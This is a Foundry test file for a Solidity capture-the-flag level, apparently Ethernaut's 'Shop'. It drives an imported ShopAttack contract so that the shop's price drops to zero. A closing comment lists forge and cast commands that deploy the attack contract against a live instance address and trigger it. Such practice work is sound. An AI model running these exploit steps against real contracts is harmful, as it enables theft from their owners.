// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Shop} from "../src/Shop.sol";
import {ShopAttack} from "../solutions/ShopAttack.sol";

contract ShopTest is Test {
    Shop public shop;
    ShopAttack public attackContract;
    address public attacker;

    function setUp() public {
        shop = new Shop();
        attacker = makeAddr("attacker");
    }

    function test_changeOwner() public {
        vm.startPrank(attacker);

        attackContract = new ShopAttack(address(shop));
        attackContract.attack();

        assertEq(shop.price(), 0);

        vm.stopPrank();
    }
}

/*
Instance address: 0x9FF1DDD7884d5CF593e4a57F9cEeC1A618B91BF5
source .env
export shop=0x9FF1DDD7884d5CF593e4a57F9cEeC1A618B91BF5

forge create solutions/ShopAttack.sol:ShopAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $shop

export attack=0x851E82240d966f95171B0594c1B648Adca6b9e7c
cast call $shop "price()" --rpc-url $RPC_URL
cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
